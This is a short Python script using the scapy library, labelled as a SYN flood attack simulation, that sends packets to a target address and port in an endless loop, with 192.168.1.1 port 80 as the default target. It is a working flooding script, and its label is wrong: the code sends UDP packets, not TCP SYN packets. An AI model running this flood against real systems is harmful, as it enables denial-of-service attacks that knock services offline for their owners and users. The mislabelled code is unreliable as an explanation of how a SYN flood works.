from scapy.all import send, IP, UDP

# Example SYN Flood Attack Simulation
def simulate_syn_flood(target_ip, target_port):
    packet = IP(dst=target_ip) / UDP(dport=target_port)
    send(packet, loop=1)

if __name__ == "__main__":
    simulate_syn_flood('192.168.1.1', 80)  # Simulate attack on port 80
